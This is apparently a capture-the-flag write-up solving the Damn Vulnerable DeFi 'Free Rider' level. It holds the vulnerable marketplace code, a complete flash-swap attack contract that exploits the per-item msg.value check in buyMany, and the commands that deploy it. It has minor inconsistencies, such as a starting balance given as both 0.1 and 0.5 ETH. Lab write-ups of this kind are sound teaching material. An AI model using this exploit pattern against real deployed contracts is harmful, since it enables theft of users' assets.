<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/10.png">

# Target Contract Review

Given contracts.

**FreeRiderNFTMarketplace.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {
    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public offersCount;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);

    error InvalidPricesAmount();
    error InvalidTokensAmount();
    error InvalidPrice();
    error CallerNotOwner(uint256 tokenId);
    error InvalidApproval();
    error TokenNotOffered(uint256 tokenId);
    error InsufficientPayment();

    constructor(uint256 amount) payable {
        DamnValuableNFT _token = new DamnValuableNFT();
        _token.renounceOwnership();
        for (uint256 i = 0; i < amount; ) {
            _token.safeMint(msg.sender);
            unchecked { ++i; }
        }
        token = _token;
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        uint256 amount = tokenIds.length;
        if (amount == 0)
            revert InvalidTokensAmount();
            
        if (amount != prices.length)
            revert InvalidPricesAmount();

        for (uint256 i = 0; i < amount;) {
            unchecked {
                _offerOne(tokenIds[i], prices[i]);
                ++i;
            }
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        DamnValuableNFT _token = token; // gas savings

        if (price == 0)
            revert InvalidPrice();

        if (msg.sender != _token.ownerOf(tokenId))
            revert CallerNotOwner(tokenId);

        if (_token.getApproved(tokenId) != address(this) && !_token.isApprovedForAll(msg.sender, address(this)))
            revert InvalidApproval();

        offers[tokenId] = price;

        assembly { // gas savings
            sstore(0x02, add(sload(0x02), 0x01))
        }

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length;) {
            unchecked {
                _buyOne(tokenIds[i]);
                ++i;
            }
        }
    }

    function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];
        if (priceToPay == 0)
            revert TokenNotOffered(tokenId);

        if (msg.value < priceToPay)
            revert InsufficientPayment();

        --offersCount;

        // transfer from seller to buyer
        DamnValuableNFT _token = token; // cache for gas savings
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }

    receive() external payable {}
}
```

The `FreeRiderNFTMarketplace` contract is a marketplace for buying and selling NFTs (Non-Fungible Tokens). It allows users to offer their NFTs for sale and buy NFTs from other users.

The constructor of the contract takes an amount parameter and mints amount number of DamnValuableNFT tokens. The tokens are minted and transferred to the contract deployer.

`offerMany()`: Allows users to offer multiple NFTs for sale at once. Users provide an array of tokenIds and an array of corresponding prices. The function checks for invalid input and stores the offers in the `offers` mapping. It emits the `NFTOffered` event for each offer made.

`_offerOne()`: Handles the logic of offering a single NFT for sale. It checks if the price is valid, if the caller is the owner of the NFT, and if the contract is approved to transfer the NFT. It then stores the offer in the `offers` mapping and increments the `offersCount` variable.

`buyMany()`: Allows users to buy multiple NFTs at once. Users provide an array of tokenIds they want to buy. The function checks if the NFTs have been offered for sale, if the payment made by the buyer is sufficient, and then transfers the NFTs to the buyer and sends the payment to the seller. It emits the `NFTBought` event for each NFT bought.

`_buyOne()`: Handles the logic of buying a single NFT. It checks if the NFT has been offered for sale, if the payment made by the buyer is sufficient, transfers the NFT to the buyer, and sends the payment to the seller.

**FreeRiderRecovery.sol**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderRecovery
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;

    uint256 private constant PRIZE = 45 ether;
    address private immutable beneficiary;
    IERC721 private immutable nft;
    uint256 private received;

    error NotEnoughFunding();
    error CallerNotNFT();
    error OriginNotBeneficiary();
    error InvalidTokenID(uint256 tokenId);
    error StillNotOwningToken(uint256 tokenId);

    constructor(address _beneficiary, address _nft) payable {
        if (msg.value != PRIZE)
            revert NotEnoughFunding();
        beneficiary = _beneficiary;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        if (msg.sender != address(nft))
            revert CallerNotNFT();

        if (tx.origin != beneficiary)
            revert OriginNotBeneficiary();

        if (_tokenId > 5)
            revert InvalidTokenID(_tokenId);

        if (nft.ownerOf(_tokenId) != address(this))
            revert StillNotOwningToken(_tokenId);

        if (++received == 6) { // bak
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(PRIZE);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
```

The FreeRiderRecovery contract is designed to recover funds from free riders who have not paid the required amount to participate in a game.

`onERC721Received()`: This function is a callback function that is called when the contract receives an ERC721 token. It verifies that the caller is the NFT token contract, the origin of the transaction is the beneficiary, the token ID is valid, and the contract is the owner of the token. If the contract has received all the required tokens (6 tokens), it transfers the prize amount to the recipient address specified in the `_data` parameter.

Challenge's message:

> A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
The developers behind it have been notified the marketplace is vulnerable. All tokens can be taken. Yet they have absolutely no idea how to do it. So they’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way.
You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.
If only you could get free ETH, at least for an instant.

## Flash Swaps

<p align="center"><img width="600" src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/0741286e-967e-429a-939f-95d87e0f795c"></p>



Flash swaps are a concept primarily associated with decentralized finance platforms built on blockchain technology, particularly Ethereum. They are a specialized form of smart contract interaction that allows users to borrow and repay assets within a single transaction without requiring collateral, as is typical in many other DeFi lending protocols.

Here's how flash swaps generally work:

- `Initialization:` A user initiates a flash swap by sending a single transaction to a smart contract on a DeFi platform that supports flash swaps. In this transaction, the user specifies the asset they want to borrow and a callback function.
- `Borrow & Callback:` The smart contract checks whether there are sufficient funds available to perform the flash swap. If there are, it temporarily lends the requested asset to the user, who can use it for any purpose during the same transaction. The user's callback function is executed within the same transaction, allowing them to perform actions with the borrowed assets.
- `Repayment:` After using the borrowed assets, the user must repay the same amount of assets back to the smart contract within the same transaction. If the user fails to repay, the transaction is typically reverted, and no flash swap occurs.
- `Profit & Fees:` Users often use flash swaps to take advantage of arbitrage opportunities, market inefficiencies, or to perform complex trading strategies without tying up their own capital. They can profit from price differences between assets or take advantage of other DeFi protocols.
- `Atomicity:` Flash swaps are atomic transactions, meaning they either execute completely or not at all. If the user fails to repay the borrowed assets within the same transaction, the entire transaction is reverted, ensuring that the liquidity pool is not left exposed to the risk of default.

Flash swaps have gained popularity in the DeFi space because they enable traders to access significant amounts of liquidity without the need for collateral. However, they also come with risks, including the potential for price manipulation and vulnerabilities in the smart contracts used to facilitate flash swaps. Additionally, the fast-paced and complex nature of flash swaps makes them a tool for experienced traders and developers in the DeFi ecosystem.



# Subverting

In the `buyMany()` function enables bulk purchasing of NFTs, verifying only if `msg.value` is equal to or greater than the price of each individual item, without considering the total price that the buyer must pay to acquire all the NFTs.

Let's consider that: There are three NFTs we want to purchase. And orderly, the prices are 1 ETH, 3 ETH 5 ETH. Normally, **we should pay 9 ETH for this three tokens**. But without this check we just have to call the function just paying the cost of the most expensive NFT like this: `buyMany{value: 5 ether}([token1, token2, token3])`

However, we only have 0.5 ETH in our wallet, and we need to pay for the gas. To solve this problem, will use **Uniswap V2 exchange for WETH/DVT**.

UniswapV2 exchanges offer a mechanism called **Flash Swaps**. Basically, it allows us to take a flashloan that must be repaid with a 0.3% fee on the amount we got loaned for the transaction. Let's apply these plans in the attack code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";


// As interface for avoiding pragma mismatch. Also saves gas.
interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint256 value) external returns (bool);
    function withdraw(uint256) external;
}


contract AttackFreeRider{
    IWETH weth;
    IERC721 nft;
    IUniswapV2Pair uniswap;
    FreeRiderNFTMarketplace marketplace;
    address recovery;
    uint[]  tokenIds = [0,1,2,3,4,5];


    constructor(address _weth, address _nft, address _uniswap, address payable _marketplace, address _recovery){
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        uniswap = IUniswapV2Pair(_uniswap);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = _recovery;
    }

    function attack()external payable{
        uniswap.swap(15 ether, 0, address(this), hex'01');
    }

    function uniswapV2Call(address, uint _amount, uint, bytes calldata) external{
        weth.withdraw(_amount);
        marketplace.buyMany{value: _amount}(tokenIds);
        uint fee = ((_amount * 3) / 997) + 1;
        uint amountToRepay = _amount + fee;
        weth.deposit{value: amountToRepay}();
        weth.transfer(address(uniswap), amountToRepay);
        for(uint i=0; i<5; i++){
            nft.safeTransferFrom(address(this), recovery, tokenIds[i],hex'');
        }
        nft.safeTransferFrom(address(this), recovery, 5, abi.encode(tx.origin));

    }

     function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return 0x150b7a02;
    }

        receive() external payable {}

}
```

Get the instances of contracts in the constructor.

```solidity
 constructor(address _weth, address _nft, address _uniswap, address payable _marketplace, address _recovery){
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        uniswap = IUniswapV2Pair(_uniswap);
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        recovery = _recovery;
}
```

In the `attack()` function, we will do flash swap to get WETH. Therefore, we must send at least 0.045135406218655967 ETH to pay the fee for the 15 WETH flash swap.

```solidity
function attack()external payable{
        uniswap.swap(15 ether, 0, address(this), hex'01');
}
```

In the `uniswapV2Call()` callback function for the flash swap, first, unwrap the flash swapped WETH to use for buying NFTs with the `withdraw()`. And then, we will expoit the faulty `buyMany()` logic to acquire all NFTs for free. Each NFT in the marketplace costs 15 ETH, so we will “just” pay 15 ETH to get all 6 NFT instead of paying 90. What a steal!

```solidity
weth.withdraw(_amount);
marketplace.buyMany{value: _amount}(tokenIds);
```

`Computing fee:` Uniswap charges 0.3% for any form of swap. Using the following code, we are computing the fee that our contract will have to bear for undertaking the flashswap.

```solidity
uint fee = ((_amount * 3) / 997) + 1;
uint amountToRepay = _amount + fee;
```

`Repayment:` We have to pay Uniswap the borrowed token including the fee. So, we will pay back the flash swap by using the following code.


```solidity
weth.deposit{value: amountToRepay}();
weth.transfer(address(uniswap), amountToRepay);
```

Finally, we will send NFTs to the `recovery` address. On final NFT transfer, recover pays out to the address passed to the data argument.

```solidity
for(uint i=0; i<5; i++){
    nft.safeTransferFrom(address(this), recovery, tokenIds[i],hex'');
}
 nft.safeTransferFrom(address(this), recovery, 5, abi.encode(tx.origin));
```


At the end of the code, we have `onERC721Received()` callback function for ERC-721 safeTransferFrom. It returns `0x150b7a02` which is equal to `bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"))`.

```solidity
 function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return 0x150b7a02;
}
```

Here are the attacker commands:

```js
await ethers.getContractFactory('AttackFreeRider', player)
.then(f => f.deploy(weth.address, nft.address, uniswapPair.address, marketplace.address, devsContract.address))
.then(c => c.attack({ value: '45135406218655968' })); // Fee to pay for the flash swap
```

Solve the challenge.

```powershell

  [Challenge] Free Rider
    ✔ Execution (234ms)


  1 passing (3s)

Done in 4.22s.
```

**_by wasny0ps_**
